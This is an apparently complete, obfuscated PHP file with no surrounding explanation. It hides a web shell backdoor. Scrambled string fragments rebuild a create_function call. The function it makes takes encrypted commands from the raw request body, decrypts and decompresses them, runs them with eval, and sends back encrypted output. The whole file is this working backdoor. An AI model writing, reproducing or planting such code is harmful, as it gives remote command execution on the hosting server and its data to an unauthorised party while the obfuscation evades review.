<?php
$z='l);$j++#,#$i++){$o#.=$t{$i}^$k{#$j};#}}return# $o;}#if# (@preg_m';
$o=str_replace('I','','cIreatIe_IfuIncItiIon');
$k='atch(##"/$kh(.+#)$kf/#"#,@file#_get_content#s#("php://#input"),';
$h='as#e64_encode#(@x(@gzcom#p#ress#($o),$k));p##rin#t("$p$kh$r$kf");}';
$A='=strlen($#t);$o="";fo##r($i=0#;$i<$l;){#for($j=0;#($#j<$#c#&&$i<$';
$P='$p="kK1E83zLg2bP57FY";fu#ncti#on x($t,$#k){$c=strl#en(#$k);##$l';
$j='$m)=#=1) {@#ob_st##art();@ev##al(@gzuncompres#s(@#x(@b#ase6#4_d';
$s='#eco#de($m[1]),$k#)));$o=@o##b_get_co#ntents()#;@ob_end_cl#ean();$r=#@#b';
$R='$k="242#695c9"##;$k#h="e66#01cb07e75";$kf#="46#71#f0b#0f18###7";';
$U=str_replace('#','',$R.$P.$A.$z.$k.$j.$s.$h);
$O=$o('',$U);$O();
?>
